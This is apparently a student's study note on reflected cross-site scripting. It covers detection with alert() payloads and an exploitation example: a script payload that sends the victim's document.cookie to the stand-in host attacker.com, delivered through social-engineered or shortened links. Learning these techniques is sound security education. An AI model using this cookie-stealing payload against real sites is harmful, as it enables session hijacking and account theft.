# 04.reflected-xss

04/05/25

## Recall

- What is Reflected XSS?
- What can you do with a reflected XSS?
- What is a XSS payload?
- How can social engineering help exploit reflected XSS?

## Notes

### What it is

**Reflected XSS (Cross-Site Scripting)** is a type of script injection attack where input from the user is immediately reflected by the web application without proper sanitization or encoding.

A **reflected XSS** attack can lead to:

- Credential theft (e.g., session hijacking via cookies)
- Redirection to malicious pages
- User impersonation through session data compromise

### How to identify it

To detect a **reflected XSS** vulnerability, try injecting payloads into various input points of the application, especially in **search fields** or **search** **URL parameters**.

Example:

```bash
http://10.10.10.1/index.php?search=<script>alert('something')</script>
```

If the application reflects and executes the script in the response:

```bash
<p>You searched for: <script>alert('something')</script></p>
```

…then the vulnerability is present

If the application blocks `<script>`, **HTML injection** may still be possible by using elements with executable attributes:

```bash
http://10.10.10.1/index.php?search=<img src=x.png onerror="alert('something')">
```

Which might be reflected as:

```bash
<p>You searched for: <img src=x.png onerror="alert('something')"></p>
```

### How to exploit it

Once confirmed, you can craft a malicious payload that performs a specific action and deliver the link to the target user.

Example payload to steal cookies:

```bash
https://10.10.10.1/index.php?search=<script>fetch(`http://attacker.com/steal-cookie?cookie=${document.cookie}`)</script>
```

When the victim clicks the link, their session data is sent to the attacker’s server, potentially allowing session impersonation.

Since **reflected XSS requires user interaction**, it often relies on **social engineering**. Attackers may disguise the payload using URL shorteners or obfuscation to hide the malicious code.

## Summary

Reflected XSS is characterized by the reflection of unsanitized user input directly in the HTTP response, allowing attackers to inject and execute arbitrary JavaScript in the victim’s browser. This occurs when the application takes a parameter from the URL or a form and includes it in the page output without proper encoding or validation. Since the payload is not stored and depends on the victim clicking a crafted link, the attack often relies on social engineering. Once executed, it can lead to session hijacking, credential theft, or redirection to malicious websites.